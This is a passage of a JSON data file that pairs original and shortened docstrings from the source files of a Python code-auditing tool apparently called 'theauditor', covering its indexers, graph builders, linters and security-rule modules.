    "original": "\"\"\"Format a section with limit and count.\n\n        Args:\n            title: Section title (e.g., \"SYMBOLS DEFINED (5)\")\n            items: List of items to format\n            format_fn: Function to format each item\n\n        Returns:\n            Formatted section string\n        \"\"\"",
    "truncated": "\"\"\"Format a section with limit and count.\"\"\""
  },
  {
    "file": "theauditor/context/formatters.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Format as human-readable text.\n\n    Handles different result types:\n    - Dict with 'symbol' + 'callers' keys (find_symbol + get_callers)\n    - List[CallSite] (callers/callees)\n    - Dict with 'incoming'/'outgoing' keys (file dependencies)\n    - List[Dict] (API endpoints)\n    - Dict with 'name' key (component tree)\n    - Dict with 'error' key (error response)\n    \"\"\"",
    "truncated": "\"\"\"Format as human-readable text.\"\"\""
  },
  {
    "file": "theauditor/context/formatters.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Format as JSON.\n\n    Converts dataclasses to dicts recursively and serializes as JSON.\n\n    Args:\n        results: Any query result type\n\n    Returns:\n        JSON string with 2-space indentation\n    \"\"\"",
    "truncated": "\"\"\"Format as JSON.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Extract base image preference from current tag.\n\n    Args:\n        current_tag: Current Docker tag (e.g., \"17-alpine3.21\")\n\n    Returns:\n        Base type: 'alpine', 'bookworm', 'bullseye', 'windowsservercore', etc.\n        Empty string if no recognizable base.\n    \"\"\"",
    "truncated": "\"\"\"Extract base image preference from current tag.\"\"\""
  },
  {
    "file": "theauditor/deps.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Create a versioned backup that won't overwrite existing backups.\n\n    Creates backups like:\n    - package.json.bak (first backup)\n    - package.json.bak.1 (second backup)\n    - package.json.bak.2 (third backup)\n\n    Returns the path to the created backup.\n    \"\"\"",
    "truncated": "\"\"\"Create a versioned backup that won't overwrite existing backups.\"\"\""
  },
  {
    "file": "theauditor/framework_detector.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Find the Cargo workspace root for a given Cargo.toml.\n\n        Walks up the directory tree looking for a Cargo.toml with [workspace] section.\n\n        Args:\n            cargo_toml_path: Path to a Cargo.toml file\n\n        Returns:\n            Path to workspace root Cargo.toml, or None if not in a workspace\n        \"\"\"",
    "truncated": "\"\"\"Find the Cargo workspace root for a given Cargo.toml.\"\"\""
  },
  {
    "file": "theauditor/graph/__init__.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Graph package - dependency and call graph functionality.\n\nCore modules (always available):\n- analyzer: Pure graph algorithms (cycles, paths, layers)\n- builder: Graph construction from source code\n- store: SQLite persistence\n\nOptional modules:\n- insights: Interpretive metrics (health scores, recommendations, hotspots)\n\"\"\"",
    "truncated": "\"\"\"Graph package - dependency and call graph functionality.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Find unreachable code blocks.\n\n        [2025 BATCH PROCESSING] Uses load_file_cfgs to eliminate N+1 queries.\n\n        Args:\n            file_path: Optional filter by file path\n\n        Returns:\n            List of unreachable blocks\n        \"\"\"",
    "truncated": "\"\"\"Find unreachable code blocks.\"\"\""
  },
  {
    "file": "theauditor/graph/cfg_builder.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Get all execution paths through a function.\n\n        Args:\n            file_path: Path to the source file\n            function_name: Name of the function\n            max_paths: Maximum number of paths to return\n\n        Returns:\n            List of paths (each path is a list of block IDs)\n        \"\"\"",
    "truncated": "\"\"\"Get all execution paths through a function.\"\"\""
  },
  {
    "file": "theauditor/graph/path_correlator.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Find a path from start to end using BFS.\n\n        Args:\n            graph: Adjacency list representation of CFG\n            start: Starting block ID\n            end: Target block ID\n\n        Returns:\n            List of block IDs representing the path, or None if no path exists\n        \"\"\"",
    "truncated": "\"\"\"Find a path from start to end using BFS.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n        Query function calls related to a node.\n\n        Args:\n            node_id: Node to query\n            direction: 'callers', 'callees', or 'both'\n\n        Returns:\n            Dict with callers and/or callees\n        \"\"\"",
    "truncated": "\"\"\"Query function calls related to a node.\"\"\""
  },
  {
    "file": "theauditor/graph/store.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n        Get nodes with high risk based on connectivity and churn.\n\n        Args:\n            threshold: Risk threshold (0-1)\n            limit: Maximum number of nodes to return\n\n        Returns:\n            List of high-risk nodes\n        \"\"\"",
    "truncated": "\"\"\"Get nodes with high risk based on connectivity and churn.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/base.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Abstract base class for language-specific DFG strategies.\n\n    Implementations:\n    - PythonOrmStrategy: Handles SQLAlchemy/Django ORM relationships\n    - NodeExpressStrategy: Handles Express middleware chains\n\n    Future:\n    - RustStrategy: Cargo/async patterns\n    - GoStrategy: Goroutines/channels\n    \"\"\"",
    "truncated": "\"\"\"Abstract base class for language-specific DFG strategies.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/node_orm.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Strategy for building Node.js ORM relationship edges.\n\n    Handles:\n    - Sequelize associations (hasMany, belongsTo, hasOne, belongsToMany)\n    - TypeORM relationships (future: when typeorm_entities table exists)\n    - Prisma relations (future: when prisma_models table exists)\n\n    Creates edges from ORM model variables to their relationship attributes,\n    enabling taint tracking through model relationships.\n    \"\"\"",
    "truncated": "\"\"\"Strategy for building Node.js ORM relationship edges.\"\"\""
  },
  {
    "file": "theauditor/graph/strategies/python_orm.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Python ORM Strategy - Handles SQLAlchemy/Django ORM relationship expansion.\n\nThis strategy builds edges for ORM relationships, enabling taint tracking\nthrough model relationships (e.g., User -> user.posts).\n\nExtracted from dfg_builder.py as part of Phase 3: Strategy Pattern refactoring.\n\nPythonOrmContext inlined from taint/orm_utils.py (2025-11-27) - graph layer\nnow owns all ORM relationship logic. Taint layer is pure consumer of graph edges.\n\"\"\"",
    "truncated": "\"\"\"Python ORM Strategy - Handles SQLAlchemy/Django ORM relationship expansion.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Load potential resolver functions from symbols table.\n\n        Filters symbols to functions/methods that match resolver patterns:\n        - Names containing 'resolve', 'resolver', 'query', 'mutation'\n        - Class methods (potential Graphene/Strawberry patterns)\n        - Decorated functions (potential Ariadne/Apollo patterns)\n\n        Returns:\n            Number of resolver candidates found\n        \"\"\"",
    "truncated": "\"\"\"Load potential resolver functions from symbols table.\"\"\""
  },
  {
    "file": "theauditor/graphql/builder.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Correlates GraphQL schemas with resolver implementations.\n\n    Architecture:\n    - Phase 1: Load SDL schemas/fields from graphql_* tables\n    - Phase 2: Load symbols table (all functions/methods)\n    - Phase 3: Correlate using naming conventions + framework patterns\n    - Phase 4: Build execution graph edges\n\n    NO FALLBACKS. Database must exist and be correct.\n    \"\"\"",
    "truncated": "\"\"\"Correlates GraphQL schemas with resolver implementations.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/graphql_database.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Add a GraphQL schema file record to the batch.\n\n        Args:\n            file_path: Absolute path to .graphql/.gql file\n            schema_hash: SHA256 hash of schema content for change detection\n            language: 'sdl' for schema definition language, 'code-first' for programmatic schemas\n            last_modified: Unix timestamp of file modification (optional)\n\n        NO FALLBACKS. If schema_hash is wrong, hard fail.\n        \"\"\"",
    "truncated": "\"\"\"Add a GraphQL schema file record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/infrastructure_database.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Add a GitHub Actions workflow record to the batch.\n\n        Args:\n            workflow_path: Path to workflow file (.github/workflows/ci.yml)\n            workflow_name: Workflow name from 'name:' field or filename\n            on_triggers: JSON array of trigger events\n            permissions: JSON object of workflow-level permissions\n            concurrency: JSON object of concurrency settings\n            env: JSON object of workflow-level environment variables\n        \"\"\"",
    "truncated": "\"\"\"Add a GitHub Actions workflow record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/node_database.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Add a Vue component PARENT RECORD ONLY to the batch.\n\n        ARCHITECTURE: Normalized storage - parent record only.\n        Junction data (props, emits, setup_returns) stored via dedicated methods:\n        - add_vue_component_prop()\n        - add_vue_component_emit()\n        - add_vue_component_setup_return()\n\n        NO FALLBACKS. NO JUNCTION DISPATCH. SINGLE CODE PATH.\n        \"\"\"",
    "truncated": "\"\"\"Add a Vue component PARENT RECORD ONLY to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/database/planning_database.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Add a job (checkbox item) to a task (hierarchical task breakdown).\n\n        Args:\n            task_id: Foreign key to plan_tasks table\n            job_number: Sequential job number within task (1, 2, 3...)\n            description: Job description (e.g., \"Execute: aud deadcode | grep storage.py\")\n            completed: Boolean as INTEGER (0 = not completed, 1 = completed)\n            is_audit_job: Boolean as INTEGER (0 = regular job, 1 = audit job)\n            created_at: ISO timestamp\n        \"\"\"",
    "truncated": "\"\"\"Add a job (checkbox item) to a task (hierarchical task breakdown).\"\"\""
  },
  {
    "file": "theauditor/indexer/database/security_database.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Add an environment variable usage record to the batch.\n\n        Args:\n            file: File containing the env var access\n            line: Line number of the access\n            var_name: Name of the environment variable (e.g., \"NODE_ENV\", \"DATABASE_URL\")\n            access_type: Type of access - \"read\", \"write\", or \"check\"\n            in_function: Name of the function containing this access\n            property_access: Full property access expression (e.g., \"process.env.NODE_ENV\")\n        \"\"\"",
    "truncated": "\"\"\"Add an environment variable usage record to the batch.\"\"\""
  },
  {
    "file": "theauditor/indexer/exceptions.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Raised when extracted data does not match stored data.\n\n    This exception enforces the ZERO FALLBACK POLICY by crashing loudly\n    when data loss is detected. If extraction produces N records but\n    storage receives 0, something is critically wrong.\n\n    Attributes:\n        message: Human-readable error description\n        details: Dict containing errors and warnings for debugging\n    \"\"\"",
    "truncated": "\"\"\"Raised when extracted data does not match stored data.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract all relevant information from a file.\n\n        Args:\n            file_info: File metadata dictionary\n            content: File content\n            tree: Optional pre-parsed AST tree\n\n        Returns:\n            Dictionary containing all extracted data\n        \"\"\"",
    "truncated": "\"\"\"Extract all relevant information from a file.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/__init__.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Registry for dynamic discovery and management of extractors.\n\n    Automatically discovers all extractor modules in the extractors/ directory\n    and registers them by their supported file extensions.\n\n    Design:\n    - One extractor class per file (python.py → PythonExtractor)\n    - Extractors register themselves via supported_extensions()\n    - No hardcoded mapping - pure discovery pattern\n    \"\"\"",
    "truncated": "\"\"\"Registry for dynamic discovery and management of extractors.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check if this extractor should handle the file.\n\n        Uses frozenset O(1) lookup for performance.\n\n        Args:\n            file_path: Path to the file\n\n        Returns:\n            True if this extractor handles this config file type\n        \"\"\"",
    "truncated": "\"\"\"Check if this extractor should handle the file.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract port mappings from service config.\n\n        Handles both short syntax (\"8080:80\") and long syntax (target/published).\n\n        Args:\n            config: Service configuration dict\n\n        Returns:\n            List of port mapping strings\n        \"\"\"",
    "truncated": "\"\"\"Extract port mappings from service config.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract volume mounts from service config.\n\n        Handles both short syntax (\"/host:/container\") and long syntax (type/source/target).\n\n        Args:\n            config: Service configuration dict\n\n        Returns:\n            List of volume mount strings\n        \"\"\"",
    "truncated": "\"\"\"Extract volume mounts from service config.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/generic.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract environment variables from service config.\n\n        Handles both list format [\"KEY=value\"] and dict format {KEY: value}.\n\n        Args:\n            config: Service configuration dict\n\n        Returns:\n            Dictionary of environment variables\n        \"\"\"",
    "truncated": "\"\"\"Extract environment variables from service config.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/github_actions.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check if this extractor should handle the file.\n\n        Only match workflow files in .github/workflows/ directory.\n\n        Args:\n            file_path: Path to the file\n\n        Returns:\n            True if this is a GitHub Actions workflow file\n        \"\"\"",
    "truncated": "\"\"\"Check if this extractor should handle the file.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/graphql.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract GraphQL schema metadata from SDL file.\n\n        Args:\n            file_info: File metadata dictionary with 'path' key\n            content: Raw SDL content\n            tree: Unused (graphql-core handles parsing)\n\n        Returns:\n            Dict with keys: graphql_schemas, graphql_types, graphql_fields, graphql_field_args\n        \"\"\"",
    "truncated": "\"\"\"Extract GraphQL schema metadata from SDL file.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/graphql.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract field argument metadata from AST node.\n\n        Args:\n            node: GraphQL input value definition node\n            field_id: Parent field ID\n            field_name: Parent field name (for test convenience)\n\n        Returns:\n            Dict with argument metadata or None if invalid\n        \"\"\"",
    "truncated": "\"\"\"Extract field argument metadata from AST node.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/graphql.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extractor for GraphQL SDL (.graphql/.gql/.graphqls) files.\n\n    Uses graphql-core to parse schema definition language and extract\n    structured metadata for database storage.\n\n    ARCHITECTURE:\n    - NO fallbacks - hard fail if parsing fails\n    - Returns dict with keys matching DataStorer handler names\n    - Type IDs and field IDs are generated incrementally\n    \"\"\"",
    "truncated": "\"\"\"Extractor for GraphQL SDL (.graphql/.gql/.graphqls) files.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/graphql.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"GraphQL SDL extractor for schema definition language files.\n\nThis extractor parses .graphql, .gql, and .graphqls files to extract:\n- Schema metadata and fingerprints\n- Type definitions (object, interface, input, enum, union, scalar)\n- Field definitions with return types and directives\n- Field argument definitions\n\nNO FALLBACKS. NO REGEX. Pure AST-based extraction using graphql-core.\n\"\"\"",
    "truncated": "\"\"\"GraphQL SDL extractor for schema definition language files.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/javascript.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract all JavaScript/TypeScript information.\n\n        Args:\n            file_info: File metadata dictionary\n            content: File content (for fallback patterns only)\n            tree: Parsed AST from js_semantic_parser\n\n        Returns:\n            Dictionary containing all extracted data for database\n        \"\"\"",
    "truncated": "\"\"\"Extract all JavaScript/TypeScript information.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract all relevant information from a Python file.\n\n        Args:\n            file_info: File metadata dictionary\n            content: File content\n            tree: Optional pre-parsed AST tree\n\n        Returns:\n            Dictionary containing all extracted data\n        \"\"\"",
    "truncated": "\"\"\"Extract all relevant information from a Python file.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/python_deps.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract Python dependencies and store to database.\n\n        Args:\n            file_info: File metadata dictionary\n            content: File content\n            tree: Optional pre-parsed AST tree (not used for deps)\n\n        Returns:\n            Dict with extracted dependency data\n        \"\"\"",
    "truncated": "\"\"\"Extract Python dependencies and store to database.\"\"\""
  },
  {
    "file": "theauditor/indexer/extractors/sql.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract all relevant information from a SQL file.\n\n        Args:\n            file_info: File metadata dictionary\n            content: File content\n            tree: Optional pre-parsed AST tree (not used for SQL)\n\n        Returns:\n            Dictionary containing all extracted data\n        \"\"\"",
    "truncated": "\"\"\"Extract all relevant information from a SQL file.\"\"\""
  },
  {
    "file": "theauditor/indexer/orchestrator.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Get AST from cache or parse the file.\n\n        Args:\n            file_info: File metadata\n            file_path: Path to the file\n            js_ts_cache: Cache of pre-parsed JS/TS ASTs\n\n        Returns:\n            Parsed AST tree or None\n        \"\"\"",
    "truncated": "\"\"\"Get AST from cache or parse the file.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/__init__.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Main storage orchestrator - aggregates domain-specific handlers.\n\n    ARCHITECTURE:\n    - Single entry point: store(file_path, extracted, jsx_pass)\n    - Handler map: data_type -> handler method\n    - Each handler: 10-40 lines, focused, testable\n\n    CRITICAL: Assumes db_manager and counts are provided by orchestrator.\n    DO NOT instantiate directly - only used by IndexerOrchestrator.\n    \"\"\"",
    "truncated": "\"\"\"Main storage orchestrator - aggregates domain-specific handlers.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/base.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Base class for domain-specific storage modules.\n\nProvides shared infrastructure:\n- db_manager: DatabaseManager instance for database operations\n- counts: Statistics tracking dict (mutated across all handlers)\n- _current_extracted: Cross-cutting data access (e.g., resolved_imports)\n\nAll domain storage modules (CoreStorage, PythonStorage, etc.) inherit from\nthis base class to access shared dependencies without duplication.\n\"\"\"",
    "truncated": "\"\"\"Base class for domain-specific storage modules.\"\"\""
  },
  {
    "file": "theauditor/indexer/storage/infrastructure_storage.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Infrastructure storage handlers for IaC and GraphQL.\n\nThis module contains handlers for infrastructure patterns:\n- Terraform: files, resources, variables, outputs\n- GraphQL: schemas, types, fields, resolvers\n\nNote: CDK constructs handler remains in core_storage.py (cross-language AWS detection)\n\nHandler Count: 11\n\"\"\"",
    "truncated": "\"\"\"Infrastructure storage handlers for IaC and GraphQL.\"\"\""
  },
  {
    "file": "theauditor/insights/graph.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Graph insights module - OPTIONAL interpretive analysis for dependency graphs.\n\nThis module provides interpretive metrics like health scores, recommendations,\nand weighted rankings. It's completely optional and decoupled from core graph\nanalysis - similar to how ml.py works.\n\nIMPORTANT: This module performs interpretation and scoring, which goes beyond\npure data extraction. It's designed for teams that want actionable insights\nand are willing to accept some subjective analysis.\n\"\"\"",
    "truncated": "\"\"\"Graph insights module - OPTIONAL interpretive analysis for dependency graphs.\"\"\""
  },
  {
    "file": "theauditor/insights/ml/models.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Model training, evaluation, and persistence.\n\nHandles:\n- Schema contract validation\n- ML availability checking\n- Feature matrix construction (50+ features)\n- Label vector construction (root cause, next edit, risk)\n- Model training (GradientBoosting + Ridge + Calibration)\n- Model persistence (save/load)\n\"\"\"",
    "truncated": "\"\"\"Model training, evaluation, and persistence.\"\"\""
  },
  {
    "file": "theauditor/insights/semantic_context.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check if a finding matches this pattern.\n\n        Matches against both the finding's 'rule' and 'message' fields.\n\n        Args:\n            finding: Dictionary with 'rule' and 'message' keys\n\n        Returns:\n            True if pattern matches the finding\n        \"\"\"",
    "truncated": "\"\"\"Check if a finding matches this pattern.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Record pipeline execution summary.\n\n        Args:\n            total_phases: Total number of phases executed\n            failed_phases: Number of failed phases\n            total_files: Total files analyzed\n            total_findings: Total findings detected\n            elapsed: Total execution time\n            status: Overall status (complete, partial, failed)\n        \"\"\"",
    "truncated": "\"\"\"Record pipeline execution summary.\"\"\""
  },
  {
    "file": "theauditor/journal.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Read events from journal with optional filtering.\n\n        Args:\n            event_type: Filter by event type\n            since: Only events after this timestamp\n            session_id: Filter by session ID\n\n        Returns:\n            List of matching events\n        \"\"\"",
    "truncated": "\"\"\"Read events from journal with optional filtering.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Initialize with project root and database path.\n\n        Args:\n            root_path: Project root directory\n            db_path: Path to repo_index.db\n\n        Raises:\n            ValueError: If paths are invalid\n            RuntimeError: If toolbox doesn't exist\n        \"\"\"",
    "truncated": "\"\"\"Initialize with project root and database path.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Run ESLint with our config and parse output.\n\n        Uses batching to avoid command-line length limits (Windows 8191 chars, Linux ~2MB).\n\n        Args:\n            files: List of file paths to lint\n\n        Returns:\n            List of finding dictionaries\n        \"\"\"",
    "truncated": "\"\"\"Run ESLint with our config and parse output.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Run Ruff with our config and parse output.\n\n        Uses batching to avoid command-line length limits.\n\n        Args:\n            files: List of file paths to lint\n\n        Returns:\n            List of finding dictionaries\n        \"\"\"",
    "truncated": "\"\"\"Run Ruff with our config and parse output.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Run Mypy with our config and parse output.\n\n        Uses batching to avoid command-line length limits.\n\n        Args:\n            files: List of file paths to type-check\n\n        Returns:\n            List of finding dictionaries\n        \"\"\"",
    "truncated": "\"\"\"Run Mypy with our config and parse output.\"\"\""
  },
  {
    "file": "theauditor/linters/linters.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Normalize path to forward slashes and make relative to project root.\n\n        Includes path traversal protection per security audit.\n\n        Args:\n            path: Absolute or relative path\n\n        Returns:\n            Normalized relative path with forward slashes\n        \"\"\"",
    "truncated": "\"\"\"Normalize path to forward slashes and make relative to project root.\"\"\""
  },
  {
    "file": "theauditor/manifest_parser.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Parse Cargo.toml for Rust dependencies and workspace info.\n\n        Returns:\n            Dict with keys:\n            - dependencies: {name: version_or_spec}\n            - dev_dependencies: {name: version_or_spec}\n            - workspace_dependencies: {name: version_or_spec} (if workspace root)\n            - workspace_members: [str] (if workspace root)\n            - is_workspace_member: bool\n        \"\"\"",
    "truncated": "\"\"\"Parse Cargo.toml for Rust dependencies and workspace info.\"\"\""
  },
  {
    "file": "theauditor/module_resolver.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Resolve import using the appropriate context's path mappings.\n\n        Args:\n            import_path: The import string (e.g., '@config/app')\n            source_file: The file containing the import\n            context: Which tsconfig context ('backend', 'frontend', 'root')\n\n        Returns:\n            Resolved path or original if no match\n        \"\"\"",
    "truncated": "\"\"\"Resolve import using the appropriate context's path mappings.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Load verification spec YAML for task.\n\n        Args:\n            task_id: ID of task\n\n        Returns:\n            spec_yaml: YAML text or None if no spec\n\n        NO FALLBACKS. Returns None if task has no spec (not an error).\n        \"\"\"",
    "truncated": "\"\"\"Load verification spec YAML for task.\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Insert spec and return spec ID (internal helper).\n\n        Args:\n            plan_id: ID of plan\n            spec_yaml: YAML specification text\n            spec_type: Optional spec type (e.g., \"api_migration\")\n\n        Returns:\n            spec_id: ID of created spec\n        \"\"\"",
    "truncated": "\"\"\"Insert spec and return spec ID (internal helper).\"\"\""
  },
  {
    "file": "theauditor/planning/manager.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Planning database manager.\n\nThis module manages planning.db operations following DatabaseManager pattern.\n\nARCHITECTURE: Separate planning.db from repo_index.db\n- planning.db stores plans, tasks, specs, and code snapshots\n- repo_index.db remains unchanged (used for verification)\n- Shadow git repo (.pf/snapshots.git) for efficient snapshot storage\n- NO FALLBACKS. Hard failure if planning.db malformed or missing.\n\"\"\"",
    "truncated": "\"\"\"Planning database manager.\"\"\""
  },
  {
    "file": "theauditor/project_summary.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Generate a text-based directory tree representation.\n\n    Args:\n        root_path: Root directory to analyze\n        max_depth: Maximum depth to traverse\n\n    Returns:\n        String representation of directory tree\n    \"\"\"",
    "truncated": "\"\"\"Generate a text-based directory tree representation.\"\"\""
  },
  {
    "file": "theauditor/project_summary.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"\n    Aggregate project-wide statistics from manifest and database.\n\n    Args:\n        manifest_path: Path to manifest.json\n        db_path: Path to repo_index.db\n\n    Returns:\n        Dictionary containing project statistics\n    \"\"\"",
    "truncated": "\"\"\"Aggregate project-wide statistics from manifest and database.\"\"\""
  },
  {
    "file": "theauditor/rules/auth/password_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Detect passwords in GET request parameters.\n\n    Passwords in URLs are logged in:\n    - Browser history\n    - Server access logs\n    - Proxy logs\n    - Referrer headers\n\n    CWE-598: Use of GET Request Method With Sensitive Query Strings\n    \"\"\"",
    "truncated": "\"\"\"Detect passwords in GET request parameters.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/config.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Configuration and pattern definitions for dependency analysis rules.\n\nThis module contains all constant definitions, typosquatting dictionaries,\nand pattern frozensets used by dependency security rules.\n\nDesign principles:\n- Use frozensets for O(1) membership tests\n- Keep patterns finite and maintainable\n- No regex (use string matching for performance)\n\"\"\"",
    "truncated": "\"\"\"Configuration and pattern definitions for dependency analysis rules.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/ghost_dependencies.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Extract all declared package names from package_configs table.\n\n    Queries package_configs and parses JSON dependency fields.\n\n    Args:\n        cursor: Database cursor\n\n    Returns:\n        Set of declared package names (normalized to lowercase)\n    \"\"\"",
    "truncated": "\"\"\"Extract all declared package names from package_configs table.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/ghost_dependencies.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Find packages that are imported but not declared.\n\n    Args:\n        cursor: Database cursor\n        imported_packages: Dict of package -> [(file, line, ...)]\n        declared_deps: Set of declared package names\n\n    Returns:\n        List of findings for ghost dependencies\n    \"\"\"",
    "truncated": "\"\"\"Find packages that are imported but not declared.\"\"\""
  },
  {
    "file": "theauditor/rules/dependency/suspicious_versions.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check dependency versions for suspicious patterns.\n\n    Args:\n        file_path: Path to package file\n        deps_json: JSON string of dependencies\n        is_dev: True if these are dev dependencies\n\n    Returns:\n        List of findings for this dependency set\n    \"\"\"",
    "truncated": "\"\"\"Check dependency versions for suspicious patterns.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/compose_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check if sensitive ports are exposed externally.\n\n    Args:\n        file_path: Path to compose file\n        service_name: Name of the service\n        port_mapping: Port mapping string (e.g., \"0.0.0.0:3306:3306\")\n\n    Returns:\n        List of findings for port exposure issues\n    \"\"\"",
    "truncated": "\"\"\"Check if sensitive ports are exposed externally.\"\"\""
  },
  {
    "file": "theauditor/rules/deployment/compose_analyze.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check Docker image for security issues.\n\n    Args:\n        file_path: Path to compose file\n        service_name: Name of the service\n        image: Docker image string\n\n    Returns:\n        List of findings for image issues\n    \"\"\"",
    "truncated": "\"\"\"Check Docker image for security issues.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/artifact_poisoning.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check if download job depends on any upload job.\n\n    Args:\n        download_job_id: Job ID of download job\n        upload_jobs: List of upload job IDs\n        cursor: Database cursor\n\n    Returns:\n        True if download job depends on any upload job\n    \"\"\"",
    "truncated": "\"\"\"Check if download job depends on any upload job.\"\"\""
  },
  {
    "file": "theauditor/rules/github_actions/untrusted_checkout.py",
    "line": -1,
    "original_lines": 10,
    "original": "\"\"\"Check if checkout step uses untrusted PR ref.\n\n    Args:\n        step_id: Step identifier\n        with_args: JSON string of with: arguments\n        cursor: Database cursor\n\n    Returns:\n        True if checkout uses untrusted ref\n    \"\"\"",
    "truncated": "\"\"\"Check if checkout step uses untrusted PR ref.\"\"\""
  },
  {
    "file": "theauditor/rules/graphql/mutation_auth.py",
    "line": -1,
    "original_lines": 10,
